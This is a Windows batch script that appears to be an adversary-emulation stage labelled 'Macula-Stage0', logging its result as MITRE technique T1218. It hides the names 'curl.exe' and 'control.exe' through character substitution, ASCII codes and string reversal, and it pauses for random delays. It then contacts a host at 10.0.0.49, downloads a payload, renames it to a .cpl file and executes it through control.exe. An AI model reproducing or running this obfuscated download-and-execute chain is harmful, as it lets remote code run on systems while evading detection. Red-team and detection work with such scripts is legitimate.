@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8020\e17130c2
SET fpakbq=Macula-Stage0-8020
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8020-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=wimrar.txt
SET fpldhe=8020

REM Ensure directory exists for log file
IF NOT EXIST "%APPDATA%\%yydue%\" MD "%APPDATA%\%yydue%\"
SET "logfile=%APPDATA%\%yydue%\macula-simulations.log"

REM Internal random variables
SET ttpresult=1
SET ttpdetail=
SET c1=1
SET c2=2
SET c3=3
SET c4=4
SET c5=5
SET c6=6
SET c7=7
SET c8=8
SET m1=9
SET m2=10
SET m3=11
SET m4=12
SET m5=13

REM Initial random delay (30-60s)
SET /A delay=!RANDOM! %% 31 + 30
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay=!delay!s>> "!logfile!" 2>nul
timeout /t !delay! /nobreak >nul

REM Build curl.exe using character substitution
SET encoded1=XYZl.exe
SET lolbin1=!encoded1:XYZ=cur!
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: curl_build=!lolbin1!>> "!logfile!" 2>nul

REM Build -k -s -o nul arguments using character codes
SET code1=45
SET code2=107
SET code3=32
SET code4=45
SET code5=115
SET code6=32
SET code7=45
SET code8=111
SET code9=32
SET code10=110
SET code11=117
SET code12=108
SET argstr=
FOR /L %%i IN (1,1,12) DO (
    CMD /C EXIT !code%%i!
    FOR /F %%c IN ('cmd /c "echo =!^=ExitCodeAscii!"') DO SET argstr=!argstr!%%c
)

REM Heartbeat check with obfuscated curl
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_start=!rdzgrnne!>> "!logfile!" 2>nul
ping -n 10 127.0.0.1 >nul
!lolbin1! !argstr! "!rdzgrnne!" 
IF !ERRORLEVEL! NEQ 0 (
    SET ttpresult=0
    SET ttpdetail=heartbeat_failed
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_complete=!ERRORLEVEL!>> "!logfile!" 2>nul

REM Random delay between operations
SET /A delay=!RANDOM! %% 15 + 5
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: delay_between_ops=!delay!s>> "!logfile!" 2>nul
CHOICE /C Y /T !delay! /D Y >nul

REM Build download URL using PHR_ variables (not obfuscated)
SET downloadurl=!repbmqg!
SET outputpath=!yktnwwf!\!edjwtl!

REM Download with obfuscated curl
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: download_start=!downloadurl!>> "!logfile!" 2>nul
!lolbin1! -k -s -o "!outputpath!" "!downloadurl!"
IF !ERRORLEVEL! NEQ 0 (
    SET ttpresult=0
    SET ttpdetail=download_failed
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: download_complete=!ERRORLEVEL!>> "!logfile!" 2>nul

REM Random delay
timeout /t 12 /nobreak >nul

REM Rename to file.cpl
SET newname=!yktnwwf!\file.cpl
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_start=!outputpath!>> "!logfile!" 2>nul
MOVE /Y "!outputpath!" "!newname!" >nul
IF !ERRORLEVEL! NEQ 0 (
    SET ttpresult=0
    SET ttpdetail=rename_failed
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_complete=!ERRORLEVEL!>> "!logfile!" 2>nul

REM Build control.exe using reversed string
SET reversed1=exe.lortnoc
SET bin2=
FOR /L %%i IN (10,-1,0) DO (
    SET bin2=!bin2!!reversed1:~%%i,1!
)

REM Execute DLL via control.exe
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_load_start=!newname!>> "!logfile!" 2>nul
%bin2% "!newname!"
IF !ERRORLEVEL! NEQ 0 (
    SET ttpresult=0
    SET ttpdetail=execution_failed
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_load_complete=!ERRORLEVEL!>> "!logfile!" 2>nul

REM Format timestamp for TTP logging
SET year=%DATE:~-4%
SET month=%DATE:~4,2%
SET day=%DATE:~7,2%
SET ttime=0%TIME%
SET ttime=!ttime:~-11!
SET tstamp=!year!-!month!-!day! !ttime:~0,8!.!ttime:~9,2!

REM TTP logging
>> "!logfile!" 2>nul (
    echo [!tstamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed_Binary_Proxy_Execution=!ttpresult!:!ttpdetail!
)

REM Final random delay
SET /A delay=!RANDOM! %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: final_delay=!delay!s>> "!logfile!" 2>nul
timeout /t !delay! /nobreak >nul